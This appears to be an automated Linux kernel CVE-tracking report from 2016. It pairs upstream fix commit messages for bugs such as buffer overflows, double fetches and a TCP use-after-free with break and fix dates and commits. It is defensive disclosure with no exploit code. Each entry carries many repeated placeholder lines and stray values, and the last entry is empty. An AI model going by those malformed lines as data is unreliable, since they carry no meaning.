    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
